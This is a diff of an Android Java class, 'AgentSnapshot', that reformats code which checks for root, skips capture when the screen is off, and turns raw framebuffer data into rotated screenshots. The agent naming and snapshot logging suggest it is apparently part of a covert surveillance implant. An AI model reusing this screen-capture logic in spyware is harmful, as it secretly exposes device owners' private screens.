@@ -92,7 +92,6 @@ public class AgentSnapshot extends AgentBase {
 	public void begin() {
 		setDelay(this.delay);
 		setPeriod(this.delay);
-		
 	}
 
 	/*
@@ -113,29 +112,27 @@ public class AgentSnapshot extends AgentBase {
 	@Override
 	public synchronized void go() {
 		switch (type) {
-		case CAPTURE_FULLSCREEN:
-
-			if (Cfg.DEBUG)
-				Check.log( TAG + " Snapshot Agent: logging full screen");
-			break;
-
-		case CAPTURE_FOREGROUND:
-			if (Cfg.DEBUG)
-				Check.log( TAG + " Snapshot Agent: logging foreground window");
-			break;
-
-		default:
-			if (Cfg.DEBUG)
-				Check.log( TAG + " Snapshot Agent: wrong capture parameter");
-			break;
+			case CAPTURE_FULLSCREEN:
+				if (Cfg.DEBUG)
+					Check.log( TAG + " Snapshot Agent: logging full screen");
+				break;
+	
+			case CAPTURE_FOREGROUND:
+				if (Cfg.DEBUG)
+					Check.log( TAG + " Snapshot Agent: logging foreground window");
+				break;
+	
+			default:
+				if (Cfg.DEBUG)
+					Check.log( TAG + " Snapshot Agent: wrong capture parameter");
+				break;
 		}
 
 		try {
-
 			if (Status.self().haveRoot()) {
-				
 				boolean isScreenOn = ListenerStandby.isScreenOn();
-				if(!isScreenOn){
+				
+				if (!isScreenOn) {
 					if(Cfg.DEBUG) Check.log( TAG + " (go): Screen powered off, no snapshot");
 					return;
 				}
@@ -143,10 +140,11 @@ public class AgentSnapshot extends AgentBase {
 				Display display = ((WindowManager) Status.getAppContext()
 						.getSystemService(Context.WINDOW_SERVICE))
 						.getDefaultDisplay();
+				
 				int width, height;
 				int orientation = display.getOrientation();
-				if (orientation == Surface.ROTATION_0
-						|| orientation == Surface.ROTATION_180) {
+				
+				if (orientation == Surface.ROTATION_0 || orientation == Surface.ROTATION_180) {
 					width = display.getWidth();
 					height = display.getHeight();
 				} else {
@@ -161,9 +159,7 @@ public class AgentSnapshot extends AgentBase {
 				// int[] pixels = new int[ width * height];
 
 				if (raw != null) {
-
-					Bitmap bitmap = Bitmap.createBitmap(width, height,
-							Bitmap.Config.ARGB_8888);
+					Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
 
 					ByteBuffer buffer = ByteBuffer.wrap(raw);
 					bitmap.copyPixelsFromBuffer(buffer);
@@ -172,6 +168,7 @@ public class AgentSnapshot extends AgentBase {
 
 					if (orientation != Surface.ROTATION_0) {
 						Matrix matrix = new Matrix();
+						
 						if (orientation == Surface.ROTATION_90)
 							matrix.setRotate(270);
 						else if (orientation == Surface.ROTATION_270)
